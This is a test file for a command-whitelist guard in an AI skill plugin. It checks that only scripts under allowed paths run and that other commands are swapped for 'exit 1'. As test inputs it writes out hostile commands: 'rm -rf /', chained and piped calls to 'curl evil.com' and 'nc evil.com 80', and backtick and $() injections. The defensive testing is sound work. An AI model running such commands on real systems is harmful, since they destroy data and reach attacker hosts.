import { describe, expect, test } from 'bun:test'
import { createWhitelist } from '../../../../src/core/ai/plugins/skill/whitelist'

describe('createWhitelist', () => {
  test('allows commands starting with scripts/', () => {
    const guard = createWhitelist()
    const result = guard({ command: 'scripts/greet.sh' })
    expect(result).toBeUndefined()
  })

  test('allows bash interpreter + scripts/ path', () => {
    const guard = createWhitelist()
    expect(guard({ command: 'bash scripts/greet.sh' })).toBeUndefined()
    expect(guard({ command: 'sh scripts/greet.sh' })).toBeUndefined()
  })

  test('allows commands with custom patterns', () => {
    const guard = createWhitelist(['bin/', 'tools/'])
    expect(guard({ command: 'bin/run.sh' })).toBeUndefined()
    expect(guard({ command: 'bash tools/check.sh' })).toBeUndefined()
  })

  test('blocks commands not referencing allowed path', () => {
    const guard = createWhitelist()
    const result = guard({ command: 'rm -rf /' })
    expect(result).toEqual({ command: 'exit 1' })
  })

  test('blocks commands with shell metacharacter ;', () => {
    const guard = createWhitelist()
    const result = guard({ command: 'scripts/greet.sh; rm -rf /' })
    expect(result).toEqual({ command: 'exit 1' })
  })

  test('blocks commands with shell metacharacter &&', () => {
    const guard = createWhitelist()
    const result = guard({ command: 'scripts/greet.sh && curl evil.com' })
    expect(result).toEqual({ command: 'exit 1' })
  })

  test('blocks commands with pipe |', () => {
    const guard = createWhitelist()
    const result = guard({ command: 'scripts/greet.sh | nc evil.com 80' })
    expect(result).toEqual({ command: 'exit 1' })
  })

  test('blocks commands with backtick', () => {
    const guard = createWhitelist()
    const result = guard({ command: 'scripts/`rm -rf /`.sh' })
    expect(result).toEqual({ command: 'exit 1' })
  })

  test('blocks commands with $() subshell', () => {
    const guard = createWhitelist()
    const result = guard({ command: 'scripts/$(whoami).sh' })
    expect(result).toEqual({ command: 'exit 1' })
  })

  test('trims whitespace before checking', () => {
    const guard = createWhitelist()
    expect(guard({ command: '  scripts/greet.sh  ' })).toBeUndefined()
    expect(guard({ command: '  rm -rf /  ' })).toEqual({ command: 'exit 1' })
  })
})
